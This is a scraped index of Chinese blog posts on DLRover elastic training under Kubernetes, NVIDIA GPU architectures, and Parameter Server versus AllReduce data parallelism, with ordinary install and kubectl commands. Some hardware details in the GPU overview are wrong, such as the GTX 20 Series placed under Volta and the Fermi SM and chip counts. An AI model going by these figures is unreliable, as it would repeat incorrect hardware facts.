f.write(record.to_json(indent=4)) 3.6 小结 Trainer 主要有两个功能:\n使用 LocalElasticAgent 管理节点上的训练进程 使用 gRPC 进行数据的上报，包括训练速度、资源使用情况 4. 总结 本篇分析了 DLRover 在 Kubernetes 下的实现细节，主要涉及 AllReduce 策略下的训练任务，跳过了 PS 任务以及 Brain 相关内容:\nDLRover Operator 定义了作业和扩容相关的字段，维护相关状态。只是启动 DLRover Master，没有弹性、容错相关的逻辑实现 每个训练任务都会启动一个 DLRover Master，掌控着整个训练节奏，其中: JobMnager 用于管理作业的启停、容错、扩缩容 RenderzerManager 用于节点的组网 TaskManager 用于管理数据分片 MetricCollector 用于收集训练指标 ElasticPSService 用于管理 PS 任务中的参数节点 DLRover 在处理异常时，会将检测状态封装为 NodeEvent，通过 DLRover Master 中的 _process_event 来统一处理 使用 dlrover-run 脚本启动训练任务时，DLRover 会使用 Pytorch 中的 LocalElasticAgent 管理节点上的训练进程; 同时启动一个监控进程，将训练相关的指标通过 gRPC 上报给 DLRover Master ","description":"","id":31,"section":"post","tags":["博文","DLRover","Kubernetes","训练","故障自愈","源码"],"title":"Kubernetes 下的 DLRover 工作流程分析","uri":"https://www.chenshaowen.com/blog/kubernetes-dlrover-workflow-analysis.html"},{"content":"1. 产品线 GeForce 面向游戏玩家，提供强大的图形处理能力、先进的游戏技术。\n常见的有 NVIDIA GTX 系列、高端的 RTX 系列、Titan 系列。\nQuadro 面向专业市场，如设计师、工程师、科学家和内容创作者。\n常见的有 Quadro P 系列，高端的 Quadro RTX 系列\nTesla 面向数据中心和高性能计算（HPC）市场，提供强大算力，适用于科学研究、深度学习。\n常见的型号有 V100、A100 等。\nClara 面向医疗成像和生命科学领域，提供 AI 和加速计算能力，用于医学影像处理和生命数据分析\nJetson 面向边缘计算和机器人市场，提供小型化、低功耗的 AI 计算模块，适合嵌入式系统和机器人应用\nOrin 面向自动驾驶和边缘 AI 市场，高能效的 SoC（System on Chip），集成了 CPU、GPU 和深度学习加速器\n2. 命名规则 2.1 系列名称 GeForce，针对消费者和游戏市场的显卡系列。通常用于主流和高性能游戏显卡 Quadro，专业图形显卡系列，面向图形设计、3D 渲染和工程应用等领域 Tesla，专为数据中心、高性能计算（HPC）、AI 研究设计的 GPU 系列 Titan，高端显卡系列，介于消费者和专业市场之间，兼具游戏和计算能力 RTX，包含实时光线追踪技术的显卡，适用于游戏和高性能计算 GTX，面向主流和高性能游戏市场，不具备 RTX 系列的光线追踪功能 2.2 架构代号 每一代显卡都会采用新的架构代号，如 Kepler、Maxwell、Pascal、Volta、Turing、Ampere、Hopper 等。通常不直接在显卡型号中显示，但可以通过显卡的代号或发布日期推测其架构。 2.3 型号数字 首位数字，表示显卡的代系。例如，GTX 1080 中的 10 表示第 10 代（Pascal 架构），RTX 3080 中的 30 表示第 30 系列（Ampere 架构） 第二位数字，表示显卡的定位或性能等级，数字越大，性能越强。例如，RTX 3080 比 RTX 3070 性能更强 末尾字母: Ti，\u0026ldquo;Titanium\u0026rdquo; 的缩写，表示该型号的性能增强版，通常比不带 Ti 的同代型号性能更强。 SUPER，表示升级版本，通常比基础型号有更好的性能和性价比。 Ultra，很少使用，但有时用于表示更高性能的版本。 2.4 特别型号 Founders Edition (FE)，这是 NVIDIA 自己发布的显卡版本，通常在显卡发布初期推出，具有独特的外观设计和散热方案 OEM，面向原始设备制造商（OEM）的显卡型号，可能与零售版有不同的规格 2.5 命名示例 GeForce RTX 3090 Ti:\nGeForce，消费级游戏显卡系列。 RTX，支持实时光线追踪的系列。 30，代表 30 系列显卡，基于 Ampere 架构。 90，高端型号。 Ti，性能增强版。 Quadro RTX 5000:\nQuadro，专业图形工作站显卡。 RTX，支持实时光线追踪。 5000，中高端专业显卡型号。 3. 硬件计算核心 CUDA Core CUDA Core 是 NVIDIA GPU 上的计算核心单元，用于执行通用的并行计算任务，是最常看到的核心类型。NVIDIA 通常用最小的运算单元表示自己的运算能力，CUDA Core 指的是一个执行基础运算的处理元件，我们所说的 CUDA Core 数量，通常对应的是 FP32 计算单元的数量。\nTensor Core Tensor Core 是 NVIDIA Volta 架构及其后续架构（如 Ampere 架构）中引入的一种特殊计算单元。它们专门用于深度学习任务中的张量计算，如矩阵乘法和卷积运算。Tensor Core 核心特别大，通常与深度学习框架（如 TensorFlow 和 PyTorch）相结合使用，它可以把整个矩阵都载入寄存器中批量运算，实现十几倍的效率提升。\nRT Core (Ray Tracing Core) RT Core 是 NVIDIA 的专用硬件单元，主要用于加速光线追踪计算。正常数据中心级的 GPU 核心是没有 RT Core 的，主要是消费级显卡才为光线追踪运算添加了 RT Core。RT Core 主要用于游戏开发、电影制作和虚拟现实等需要实时渲染的领域。\n4. NVIDIA 通用 GPU 架构 4.1 Tesla 架构 Tesla 架构发布于 2006 年。Tesla 架构全新的 CUDA 架构，支持使用 C 语言进行 GPU 编程，可以用于通用数据并行计算。Tesla 架构具有 128 个流处理器，带宽高达 86GB/s，标志着 GPU 开始从专用图形处理器转变为通用数据并行处理器。\n典型卡型号:\nTesla C1060 Tesla M1060 Tesla S1070 4.2 Fermi 架构 Fermi 架构发布于 2008 年。Fermi 架构是第一个采用 GPU-Direct 技术的 GPU 架构，它拥有 32 个 SM（流多处理器）和 16 个 PolyMorph Engine 阵列，每个 SM 都拥有 1 个 PolyMorph Engine 和 64 个 CUDA 核心。该架构采用了 4 颗芯片的模块化设计，拥有 32 个光栅化处理单元和 16 个纹理单元，搭配 GDDR5 显存。\n典型卡型号:\nGeForce GTX 480 GeForce GTX 470 Quadro 6000 Quadro 5000 Quadro 4000 Quadro Plex 7000 GeForce GTX 465 4.4. Kepler 架构 Kepler 架构发布于 2012 年。Kepler 架构采用 28nm 制程，是首个支持超级计算和双精度计算的 GPU 架构。Kepler GK110 具有 2880 个流处理器和高达 288GB/s 的带宽，计算能力比 Fermi 架构提高 3-4 倍。Kepler 架构的出现使 GPU 开始成为高性能计算的关注点。\n典型卡型号:\nGeForce GTX 680 GeForce GTX Titan GeForce GTX 780 GeForce GTX 770 GeForce GTX 760 GeForce GTX 780 Ti GeForce GTX Titan Black 4.4. Maxwell 架构 Maxwell 架构发布于 2014 年。Maxwell 架构采用 28nm 制程。Maxwell 架构在功耗效率、计算密度上获得重大提升，一个流处理器拥有 128 个 CUDA 核心，而 Kepler 仅有 64 个。GM200 具有 3072 个 CUDA 核心和 336GB/s 带宽，但功耗只有 225W，计算密度是 Kepler 的两倍。Maxwell 标志着 GPU 的节能计算时代到来。\n典型卡型号:\nGeForce GTX 750 Ti GeForce GTX 750 GeForce GTX 980 GeForce GTX 970 GeForce GTX Titan X NVIDIA Tegra X1 4.5. Pascal 架构 Pascal 架构发布于 2016 年。Pascal 架构采用 16nm FinFETPlus 制程，增强了 GPU 的能效比和计算密度。Pascal GP100 具有 3840 个 CUDA 核心和 732GB/s 的显存带宽，但功耗只有 300W，比 Maxwell 架构提高 50%以上。Pascal 架构使 GPU 可以进入更广泛的人工智能、汽车等新兴应用市场。\n典型卡型号\nTesla P100 GeForce GTX 10 Series Titan X (Pascal) Quadro GP100 Quadro P6000 这类 GPU 缺乏低精度的硬件加速能力，但却具备中等的单精度算力。由于价格便宜，适合用来练习训练小模型(如 Cifar10 )或调试模型代码。\n4.6 Volta 架构 Volta 架构发布于 2017 年。Volta 架构采用 12nm FinFET 制程。Volta 架构新增了张量核心，可以大大加速人工智能和深度学习的训练与推理。Volta GV100 具有 5120 个 CUDA 核心和 900GB/s 的带宽，加上 640 个张量核心，AI 计算能力达到 112 TFLOPS，比 Pascal 架构提高了近 3 倍。Volta 的出现标志着 AI 成为 GPU 发展的新方向。\n典型卡型号:\nTesla V100 GeForce Titan V GeForce GTX 20 Series Quadro GV100 这类 GPU 搭载专为低精度(int8/float16)计算加速的 Tensor Core， 但单精度算力相较于上代提升不大。建议启用深度学习框架的混合精度训练来加速模型计算。 相较于单精度训练，混合精度训练通常能够提供 2 倍以上的训练加速。\n4.7. Turing 架构 Turing 架构发布于 2018 年。Turing 架构采用 12nm FinFET 制程。Turing 架构新增了 Ray Tracing 核心(RT Core)，可硬件加速光线追踪运算。Turing TU102 具有 4608 个 CUDA 核心、576 个张量核心和 72 个 RT 核心，支持 GPU 光线追踪，代表了图形技术的新突破。同时，Turing 架构在人工智能方面性能也有较大提升。\n典型卡型号:\nGeForce RTX 20 Series Quadro RTX 6000 Quadro RTX 8000 NVIDIA Turing T4 4.8. Ampere 架构 Ampere 架构发布于 2020 年。Ampere 架构在计算能力、能效和深度学习性能方面都有重大提升。Ampere 架构的 GPU 采用了多个流多处理器（SM）和更大的总线宽度，提供了更多的 CUDA Core 和更高的频率。它还引入了第三代 Tensor Core，提供更强大的深度学习计算性能。Ampere 架构的 GPU 还具有更高的内存容量和带宽，适用于大规模的数据处理和机器学习任务。\n典型卡型号:\nNVIDIA A100 NVIDIA A800 NVIDIA A40 NVIDIA A16 NVIDIA A10 GeForce RTX 30 Series NVIDIA RTX A5000 NVIDIA RTX A4000 NVIDIA RTX A3000 NVIDIA RTX A2000 这类 GPU 搭载第三代 TensorCore。相较于前一代，支持了 TensorFloat32 格式，可直接加速单精度训练 (PyTorch 已默认开启)。建议使用超高算力的 float16 半精度训练模型，可获得比上一代 GPU 更显著的性能提升。\n4.9. Hopper 架构 Hopper 架构发布于 2022 年。相较于 Ampere，Hopper 架构支持第四代 Tensor Core，且采用新型流式处理器，每个 SM 能力更强。Hopper 架构在计算能力、深度学习加速和图形功能方面带来新的创新和改进。\n典型卡型号:\nNVIDIA H100 NVIDIA H200 NVIDIA H800 NVIDIA H20 4.10. Blackwell 架构 Blackwell 架构发布于 2024 年。Blackwell 架构 GPU 具有 2080 亿个晶体管，采用专门定制的双倍光刻极限尺寸 4NP TSMC 工艺制造，通过 10 TB/s 的片间互联，将 GPU 裸片连接成一块统一的 GPU。\n典型卡型号:\nNVIDIA B40 NVIDIA B100 5. 常见 GPU 卡的算力值表 型号 显存 单精度(FP32) 半精度(FP16) 详细参数 说明 4090 24GB 82.58 T 165.2 T 查看 新一代游戏卡皇，除显存比较小和多机多卡并行效率低的缺点外，性价比非常高 H100 80GB 51.22 T 204.9 T 查看 算力、带宽、显存都很好，就是目前在国内不容易买到而且贵 H20 96GB 44 T 148 T 查看 高缓存、高带宽，但是算力性能比非特供版低 A40 48GB 37.42 T 149.7 T 查看 可以看做是 3090 的扩显存版。算力和 3090 基本持平，因此根据显存大小进行选择。需要使用 cuda11.x 3090 24GB 35.58 T 约 71T 查看 可以看做 3080Ti 的扩显存版。性能和显存大小都非常够用，适用性非常强，性价比首选。需要使用 cuda11.x 3080Ti 12GB 34.10 T 约 70T 查看 性能钢炮，如果对显存要求不高则是非常合适的选择。需要使用 cuda11.x A5000 24GB 27.77 T 约 117T 查看 性能钢炮，如果觉得 3080Ti 的显存不够用 A5000 是合适的选择，并且半精算力高适合混合精度。需要使用 cuda11.x A100 80GB 19.5 T 77.97 T 查看 新一代专业计算卡皇，除了贵没缺点。显存大，非常适合做半精计算，因为有 NVLink 600 GB/s，多卡并行加速比非常高。需要使用 cuda11.x A800 80GB 19.5 T 77.97 T 查看 与 A100 相比，主要差别在其 NVLink 速度只有 400 GB/s A4000 16GB 19.17 T 约 76T 查看 显存和算力都比较均衡，适合进阶过程使用。需要使用 cuda11.x V100 16/32GB 16.35 T 125 T 查看 老一代专业计算卡皇，半精性能高适合做混合精度计算 2080Ti 11GB 13.45 T 53.8 T 查看 图灵架构 GPU，性能还不错，老一代型号中比较适合做混合精度计算的 GPU。性价比高 3060 12GB 12.74 T 约 24T 查看 如果 1080Ti 的显存正好尴尬了，3060 是不错的选择，适合新手。需要使用 cuda11.x TITAN Xp 12GB 12.15 T 12.15 T 查看 比较老的 Pascal 架构 GPU，用作入门比较合适 Tesla P40 24GB 11.76 T 11.76 T 查看 比较老的 Pascal 架构 GPU，对于 cuda11.x 之前且对大显存有需求的算法是非常不错的选择 1080 Ti 11GB 11.34 T 11.34 T 查看 和 TITANXp 同时代的卡，同样适合入门，但是 11GB 的显存偶尔会比较尴尬 ","description":"","id":32,"section":"post","tags":["整理","AI","GPU","NVIDIA","硬件"],"title":"NVIDIA GPU 核心与架构演进史","uri":"https://www.chenshaowen.com/blog/nvidia-gpu-cores-and-architecture-evolution-history.html"},{"content":"1. Parameter Server 架构 在 Parameter Server 架构中，集群中的节点被分为两类，参数服务器节点（Parameter Server）和工作服务器节点（Worker）。\n1.1 Parameter Server Parameter Server 用于存放模型的参数。\n每个参数服务器节点负责管理和更新模型的一部分参数，而每个工作节点则只处理与其对应的数据子集。\n1.2 Worker 工作服务器节点负责执行模型的训练任务。训练的数据被分配给多个工作服务器节点。每个工作服务器节点独立进行前向和后向计算，最终产生梯度信息。\n1.3 训练过程 初始化，所有参数服务器节点完成模型权重的初始化。 权重获取，工作服务器节点从所有参数服务器节点中，pull 对应的权重。 前后向计算，工作服务器节点执行前向和后向计算，生成梯度。 梯度上传，工作服务器节点将计算得到的梯度 push 到相应的参数服务器节点。 权重更新，参数服务器节点在接收到所有工作服务器节点的梯度后，进行汇总并更新模型权重。 重复迭代，继续执行第 2 到第 5 步骤，直到达到收敛条件或结束训练。 1.4 结构的维护 Parameter Server 失败后的处理\n重新分配参数，故障的参数服务器节点的参数将被重新分配给其他可用的服务器，以保持模型的完整性。 动态负载均衡，系统会自动调整负载，确保参数在各服务器间均匀分布，防止过载。 训练的继续进行，工作服务器会与新的参数服务器重新连接，继续进行模型训练。 Worker 失败后的处理\n任务重分配，失联的 Worker 的任务会被重新分配给其他可用的 Worker，避免计算资源浪费。 渐进收敛策略，剩余 Worker 可以在少量数据上继续训练，避免长时间中断。 故障恢复，如果故障的 Worker 恢复，系统会将其重新加入训练并继续未完成的任务。 新的 Worker 加入\n数据重新分配，新 Worker 加入后，系统会将部分训练数据分配，确保负载均匀。 梯度同步，新 Worker 会从参数服务器获取最新权重，并与其他 Worker 进行梯度同步。 动态扩展，新 Worker 能够无缝融入训练流程，提升整个系统的计算能力。 1.5 框架支持 TensorFlow 原生支持 Parameter Server 架构，提供了 tf.distribute.Strategy 来实现分布式训练。\nPyTorch 可以使用 torch.distributed 包或其他库（如 Ray 和 Horovod）来实现 Parameter Server 训练。\n1.6 适用场景 大规模推荐系统 在推荐系统中，模型参数可能包括用户偏好和物品特征等，这些参数量可能非常庞大。使用 Parameter Server 可以有效地管理和更新这些参数。\n自然语言处理（NLP） 在训练大型语言模型，如 BERT 或 GPT 时，Parameter Server 可以帮助分布式地存储和更新模型的词嵌入和层间权重。\n图像识别 在训练用于图像识别的深度神经网络时，如卷积神经网络（CNN），Parameter Server 可以分布式地处理大量的滤波器权重。\n大规模线性回归 在处理具有数百万特征的线性回归问题时，Parameter Server 可以分布式地存储和更新权重矩阵。\n实时大数据分析 在需要实时更新模型参数以响应快速变化的数据模式的场景下，Parameter Server 架构可以提供所需的灵活性和扩展性。\n2. AllReduce 架构 2.1 通信环的建立 初始化 Rank 每个 Worker 都会被分配一个唯一的 Rank（通常为整数，表示 Worker 的身份和顺序）。\n建立初始通信环 根据 Worker 的 Rank，系统将每个 Worker 与其左右相邻的 Worker 进行配对，形成一个环形通信拓扑结构。假设有 N 个 Worker，则每个 Worker i 会与 i-1 和 i+1 进行通信（其中 i=0 的左邻居为 N-1，i=N-1 的右邻居为 0），从而形成一个封闭的通信环。\n2.2 训练过程 梯度分割 每个 Worker 将自己计算得到的梯度切分成多个块（通常与 Worker 数量相等）。\n梯度交换 每个 Worker 将自己持有的第一个梯度块发送给右邻居 Worker，同时接收从左邻居 Worker 传来的第一个梯度块。这一过程进行多轮通信，每一轮中，Worker 发送下一个梯度块并接收新的梯度块\n梯度累加 在每一轮通信中，Worker 不仅接收新的梯度块，还会将其与之前累加的梯度块相加，从而逐步在所有 Worker 中汇总梯度\n广播最终结果 当所有梯度块都被交换并累加完毕后，最终的累加结果会通过继续环形通信广播回每个 Worker。此时，每个 Worker 都拥有完整且同步的全局梯度信息\n2.3 结构的维护 Worker 失败后的处理\n检测失联，剩余的 Worker 会自动检测到失联的 Worker，并触发故障处理机制 重新分配 Rank，系统会自动重新分配故障 Worker 的 Rank，并更新通信拓扑 重建通信环，失联 Worker 的左右邻居将重新建立连接，形成新的环形拓扑 新的 Worker 加入\n插入通信环，新 Worker 加入后，系统会根据其 Rank 将其插入现有的通信环 建立连接，新 Worker 会与其左右邻居建立通信连接，从而扩展环的结构 通信环的同步与恢复\n状态同步，所有 Worker 在新的通信环建立后，会重新同步之前的梯度累加状态 继续训练，同步完成后，系统会继续进行后续的训练步骤，确保训练的稳定性和一致性 2.4 框架支持 PyTorch 原生支持 AllReduce 操作，提供了 torch.distributed 模块。 TensorFlow 原生支持 AllReduce，通过 tf.distribute.Strategy 模块使用 MirroredStrategy 策略使用 NVIDIA NCCL 进行 AllReduce 操作 2.5 适用场景 深度学习模型训练 在使用 TensorFlow 或 PyTorch 等深度学习框架训练大型神经网络时，AllReduce 算法可以高效地在多个 GPU 或 TPU 之间同步梯度。\n分布式优化算法 在实现分布式版本的随机梯度下降（SGD）或其他优化算法时，AllReduce 用于确保所有计算节点在每次迭代中使用相同的全局梯度估计。\n多任务学习 在多任务学习场景中，不同的任务可能在不同的计算节点上进行训练，AllReduce 可以确保所有任务共享相同的模型参数更新。\n强化学习 在分布式强化学习中，多个智能体（agents）可能需要同步它们的经验或策略更新，AllReduce 算法可以在此过程中发挥作用。\n大规模图计算 在处理大规模图数据，如社交网络分析或网络流量分析时，AllReduce 可以用于在多个计算节点间同步图的嵌入或节点特征。\n科学计算和模拟 在需要大规模并行计算的科学领域，如气候模拟、物理模拟等，AllReduce 可以用于在多个计算节点间同步模拟状态。\n","description":"","id":33,"section":"post","tags":["整理","分布式","训练","数据并行","并行架构"],"title":"分布式训练中的数据并行架构","uri":"https://www.chenshaowen.com/blog/data-parallel-architecture-in-distributed-train.html"},{"content":"1. 分布式训练面临的问题 预估训练资源困难，无法自动化 需要多少算力、需要多少时间、需要多少带宽、需要多少 CPU、需要多少内存，如果没有足够的积累，很难估算准确。导致的结果就是，超额申请、超额分配，造成极大的资源浪费。\n需要去沉淀和提供解决方案。\n故障率高，排查困难，缺少高效的工具 算法同学不太了解 Kubernetes 基础设施，运维同学不太了解训练过程，想要当好 AI Infra Engineer 不是件容易的事。\n训练场景下的故障率非常高，如何快速、准确地定位并解决故障，是我们需要思考的问题。\n单个节点发生故障，全部节点停止训练，需要人值守才能及时拉起作业继续训练 训练作业类似 Kubernetes 中的 StatefulSet。分布式训练中，由于数据、模型、流水线、张量等并行技术的存在，每个节点在训练过程中并不是完全对等的。\n从发生故障到恢复训练，有很多技术点可以落地到工具、产品上。\n同时，如果是非工作时间段发生故障，我们无法及时响应，模型迭代延期、AI 加速卡闲置都是巨大损失。能不能自动发现故障、自动恢复训练，也是值得研究的问题。\n2. 什么是 DLRover DLRover 就试图解决上诉问题的一个方案。下面是 https://github.com/intelligent-machine-learning/dlrover 项目的架构图。\n管理平面的组件：\nBrain Service，负责资源弹性优化。基于实时采集的训练速度和各个节点负载来自动优化作业的资源配置，还有一个事件采集服务 k8smonitor Elastic Controller，是 Kubernetes 对象 ElasticJob、ScalePlan 的控制器 CRD 对象:\nElasticJob 用来描述弹性训练作业 ScalePlan 用于在 Brain、DLRover Master、Elastic Controller 之间传递信息，以做出优化调整。一般不需要主动创建，DLRover 会自动管理 训练作业相关的组件：\nDLRover Job Master，负责弹性调度、容错自愈。每个训练作业拥有一个 master 节点， master 节点负责训练速度采集、节点负载收集、训练样本管理和弹性调度。 Elastic Agent 不用单独部署，是需要使用 dlrover-run 命令托管训练作业，负责与训练框架协调来支持训练的容错和弹性。每个节点上都有一个 Elastic Agent， Agent 从 master 上获取作业当前运行的节点信息，通知训练框架更新分布式训练状态。 Agent 还负责从 master 获取训练样本信息来供训练框架迭代模型，从而使训练样本分片支持 worker 的弹性。 下面这张图是其容错的架构设计:\nDLRover Job Master 负责探测、处理故障，dlrover-run 作为 Agent 上报状态信息。\n3. dlrover-run 命令及参数 安装 dlrover 包 1 pip install dlrover[torch] -U -i https://mirrors.aliyun.com/pypi/simple dlrover-run 只是对 dlrover.trainer.torch.main 的封装 1 2 3 4 5 6 7 8 9 10 cat /usr/local/bin/dlrover-run #!/usr/local/bin/python # -*- coding: utf-8 -*- import re import sys from dlrover.trainer.torch.main import main if __name__ == \u0026#39;__main__\u0026#39;: sys.argv[0] = re.sub(r\u0026#39;(-script\\.pyw|\\.exe)?$\u0026#39;, \u0026#39;\u0026#39;, sys.argv[0]) sys.exit(main()) 查看参数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 dlrover-run --help 用法: dlrover-run [-h] [--nnodes NNODES] [--nproc-per-node NPROC_PER_NODE] [--rdzv-backend RDZV_BACKEND] [--rdzv-endpoint RDZV_ENDPOINT] [--rdzv-id RDZV_ID] [--rdzv-conf RDZV_CONF] [--standalone] [--max-restarts MAX_RESTARTS] [--monitor-interval MONITOR_INTERVAL] [--start-method {spawn,fork,forkserver}] [--role ROLE] [-m] [--no-python] [--run-path] [--log-dir LOG_DIR] [-r REDIRECTS] [-t TEE] [--node-rank NODE_RANK] [--master-addr MASTER_ADDR] [--master-port MASTER_PORT] [--local-addr LOCAL_ADDR] [--network-check] [--node-unit NODE_UNIT] [--auto_config] [--auto_tunning] [--exclude-straggler] [--save_at_breakpoint] [--accelerator {nvidia.com/gpu,ascend-npu}] training_script ... Torch Distributed Elastic Training Launcher 位置参数: training_script 启动并行执行的训练程序/脚本的完整路径，后跟训练脚本的所有参数。 training_script_args 训练脚本的参数 可选参数: -h，--help 显示帮助信息并退出 --nnodes NNODES 节点数量或节点范围，格式为 \u0026lt;minimum_nodes\u0026gt;:\u0026lt;maximum_nodes\u0026gt;。 --nproc-per-node NPROC_PER_NODE，--nproc_per_node NPROC_PER_NODE 每个节点的工作进程数量；支持的值：[auto，cpu，gpu，int]。 --rdzv-backend RDZV_BACKEND，--rdzv_backend RDZV_BACKEND Rendezvous 后端。 --rdzv-endpoint RDZV_ENDPOINT，--rdzv_endpoint RDZV_ENDPOINT Rendezvous 后端的端点；通常格式为 \u0026lt;host\u0026gt;:\u0026lt;port\u0026gt;。 --rdzv-id RDZV_ID，--rdzv_id RDZV_ID 用户定义的组 ID。 --rdzv-conf RDZV_CONF，--rdzv_conf RDZV_CONF 附加的 rendezvous 配置（\u0026lt;key1\u0026gt;=\u0026lt;value1\u0026gt;,\u0026lt;key2\u0026gt;=\u0026lt;value2\u0026gt;,...）。 --standalone 启动一个本地独立的 rendezvous 后端，使用 C10d TCP 存储在端口 29400 上。用于启动单节点、多工作进程作业时非常有用。如果指定，则 --rdzv-backend、--rdzv-endpoint、--rdzv-id 会被自动分配；任何显式设置的值将被忽略。 --max-restarts MAX_RESTARTS，--max_restarts MAX_RESTARTS 最大的工作进程组重启次数，超出此次数将失败。 --monitor-interval MONITOR_INTERVAL，--monitor_interval MONITOR_INTERVAL 监控工作进程状态的时间间隔，单位为秒。 --start-method {spawn,fork,forkserver}，--start_method {spawn,fork,forkserver} 创建工作进程时使用的多进程启动方法。 --role ROLE 工作进程的用户定义角色。 -m，--module 将每个进程更改为将启动脚本解释为 Python 模块，行为与 \u0026#39;python -m\u0026#39; 相同。 --no-python，--no_python 跳过在训练脚本前添加 \u0026#39;python\u0026#39; - 直接执行脚本。如果脚本不是 Python 脚本时非常有用。 --run-path，--run_path 使用 runpy.run_path 在相同解释器中运行训练脚本。脚本必须提供为绝对路径（例如 /abs/path/script.py）。优先于 --no-python。 --log-dir LOG_DIR，--log_dir LOG_DIR 用于日志文件的基础目录（例如 /var/log/torch/elastic）。相同的目录会被多个运行重用（会创建一个以 rdzv_id 为前缀的唯一作业级子目录）。 -r REDIRECTS，--redirects REDIRECTS 将标准流重定向到日志目录中的日志文件（例如 [-r 3] 重定向所有工作进程的 stdout+stderr，[ -r 0:1,1:2] 重定向本地 rank 0 的 stdout 和本地 rank 1 的 stderr）。 -t TEE，--tee TEE 将标准流分流到日志文件和控制台（参见 --redirects 格式）。 --node-rank NODE_RANK，--node_rank NODE_RANK 多节点分布式训练中节点的排名。 --master-addr MASTER_ADDR，--master_addr MASTER_ADDR 主节点（rank 0）的地址，仅用于静态 rendezvous。它应该是 rank 0 的 IP 地址或主机名。对于单节点多进程训练，--master-addr 可以简单地是 127.0.0.1；IPv6 应该是 `[0:0:0:0:0:0:0:1]` 的模式。 --master-port MASTER_PORT，--master_port MASTER_PORT 主节点（rank 0）上用于分布式训练期间通信的端口。仅用于静态 rendezvous。 --local-addr LOCAL_ADDR，--local_addr LOCAL_ADDR 本地节点的地址。如果指定，将使用给定的地址进行连接。否则，将查找本地节点地址。否则，默认为本地计算机的 FQDN。 --network-check，--network_check 是否在启动训练过程前检查网络。 --node_unit NODE_UNIT，--node-unit NODE_UNIT 要调度的节点数量单位。调度的节点数量应为 node_unit 的倍数。 --auto_config，--auto-config 是否自动配置 nnodes 和 nproc_per_nodes。 --auto_tunning，--auto-tunning 是否自动调优并行配置。 --exclude-straggler，--exclude_straggler 布尔值，如果节点是滞后节点且参数为 True，则该节点将退出。该参数仅在 network-check 为 True 时有效。 --save_at_breakpoint，--save-at-breakpoint 布尔值。如果为 True，主进程中的代理将在训练过程失败时将检查点保存到存储中。 --accelerator {nvidia.com/gpu,ascend-npu} 机器的加速器芯片类型。 4. 使用 DLRover 快速托管训练 启动测试容器 1 nerdctl -n k8s.io run --rm -it --gpus all registry.cn-beijing.aliyuncs.com/intell-ai/dlrover:pytorch-example bash 直接运行 Python 脚本 1 2 3 4 5 6 7 8 export RANK=0 export LOCAL_RANK=0 export WORLD_SIZE=1 export MASTER_ADDR=\u0026#34;localhost\u0026#34; export MASTER_PORT=1234 python3 examples/pytorch/mnist/cnn_train.py --num_epochs 1 \\ --training_data /data/mnist_png/training/ \\ --validation_data /data/mnist_png/testing/ 我发现 --no-cuda 参数无效，只能通过控制 GPU 挂载来指定仅使用 CPU 训练。\n使用 DLRover 托管训练 不用设置环境变量直接运行即可，DLRover 帮我们省去了设置环境变量的步骤。\n1 2 3 4 5 dlrover-run --network-check --nnodes=1 \\ --nproc_per_node=1 --max_restarts=3 \\ examples/pytorch/mnist/cnn_train.py --num_epochs 1\\ --training_data /data/mnist_png/training/ \\ --validation_data /data/mnist_png/testing/ 由于使用的是单个容器进行训练，需要将 --nnodes 参数设置为 1，否则 DLRover 会一直等待新节点加入，max_restarts 设置为 3 允许失败之后重试 3 次。\n5. 集群安装 DLRover 相关组件 这里安装的是 DLRover 最新的 Release 版本 v0.3.7 ，是今年 5.13 发布的。\n下载安装包 1 2 3 wget https://github.com/intelligent-machine-learning/dlrover/archive/refs/tags/v0.3.7.tar.gz tar xvf v0.3.7.tar.gz cd dlrover-0.3.7 安装 ElasticJob Controller Manager 1 kubectl -n dlrover apply -k dlrover/go/operator/config/manifests/bases 需要注意的是默认的权限设置在 dlrover 空间下，如果想在其他空间使用，则需要创建与之对应的 default-role.yaml。\n查看工作负载 1 2 3 4 kubectl -n dlrover get pod NAME READY STATUS RESTARTS AGE dlrover-controller-manager-6d676545d7-nrc4g 2/2 Running 0 73s 查看 CRD 1 2 3 4 kubectl get crd |grep elastic elasticjobs.elastic.iml.github.io 2024-08-15T07:27:29Z scaleplans.elastic.iml.github.io 2024-08-15T07:27:29Z 如果仅使用训练 worker 自动恢复的功能，那么不用安装 Brain 等组件。因为 Brain 依赖 MySQL，仅为测试，下面部署 MySQL 的方式并不可靠。\n安装 DLRover Brain 1 kubectl -n dlrover apply -f dlrover/go/brain/manifests/k8s 创建数据库表 查看 MySQL Pod 名\n1 2 3 kubectl -n dlrover get pod |grep mysql mysql-85dd8c7fdb-kdxtz 1/1 Running 0 7m41s 执行命令，创建数据库以及初始化表\n1 2 3 kubectl exec -it mysql-85dd8c7fdb-kdxtz --namespace dlrover -- bash cd dlrover mysql -uroot -proot \u0026lt; dlrover-tables.sql 重启 Brain 相关组件 1 kubectl -n dlrover rollout restart deployment dlrover-brain dlrover-kube-monitor 查看工作负载 1 2 3 4 5 6 7 kubectl -n dlrover get pod NAME READY STATUS RESTARTS AGE dlrover-brain-689c4b77d4-bqcz9 1/1 Running 0 3m55s dlrover-controller-manager-6b6f9dcd88-2h2fs 2/2 Running 0 6m19s dlrover-kube-monitor-69ff5f99f4-gwqws 1/1 Running 0 3m55s mysql-799f94cbfd-864th 1/1 Running 0 4m17s 6. ElasticJob 创建训练作业 6.1 ElasticJob 对象定义 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 type ElasticJobSpec struct { // DistributionStrategy 指定作业的分发策略。 // 目前，策略支持 parameter-server 和 ring-allreduce。 DistributionStrategy string `json:\u0026#34;distributionStrategy,omitempty\u0026#34;` // ResourceLimits 指定作业的最大资源。例如， // {\u0026#34;cpu\u0026#34;: \u0026#34;100\u0026#34;, \u0026#34;memory\u0026#34;: \u0026#34;10240Mi\u0026#34;} 表示最大 CPU 核数为 100，所有 Pod 的最大内存为 10Gi。 ResourceLimits map[string]string `json:\u0026#34;resourceLimits,omitempty\u0026#34;` // OptimizeMode 指定优化作业资源的模式。 // 目前支持 \u0026#34;manual\u0026#34;（手动）、\u0026#34;single-job\u0026#34;（单作业）、\u0026#34;cluster\u0026#34;（集群）。 OptimizeMode string `json:\u0026#34;optimizeMode,omitempty\u0026#34;` // BrainService 指定 Brain 的地址，以优化作业资源。Brain 可以单独部署，配置在 ElasticJobSpec 中。 // 仅在 optimizeMode 